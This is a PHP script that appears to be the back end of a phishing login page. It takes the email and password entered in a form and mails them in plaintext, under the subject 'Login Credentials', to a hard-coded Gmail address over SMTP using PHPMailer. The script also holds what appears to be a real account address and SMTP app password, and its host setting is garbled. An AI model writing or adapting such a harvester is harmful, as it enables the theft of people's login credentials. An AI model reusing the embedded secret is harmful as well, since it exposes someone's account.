<?php
// Validate user input
if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
    echo "Invalid email";
    exit;
}

if (empty($_POST["password"])) {
    echo "Password cannot be empty";
    exit;
}

// Import PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require './phpmailer/src/Exception.php';
require './phpmailer/src/PHPMailer.php';
require './phpmailer/src/SMTP.php';

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host = '(link unavailable)';
    $mail->SMTPAuth = true;
    $mail->Username = 'prince.ebere56@gmail.com';
    $mail->Password = 'jlbhehqozbpxisoi';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port = 465;

    // Recipients
    $mail->setFrom($_POST["email"], $_POST["name"]);
    $mail->addAddress('prince.ebere56@gmail.com');

    // Content
    $mail->isHTML(true);
    $mail->Subject = "Login Credentials";
    $mail->Body = "Email: " . $_POST["email"] . "<br>Password: " . $_POST["password"];

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}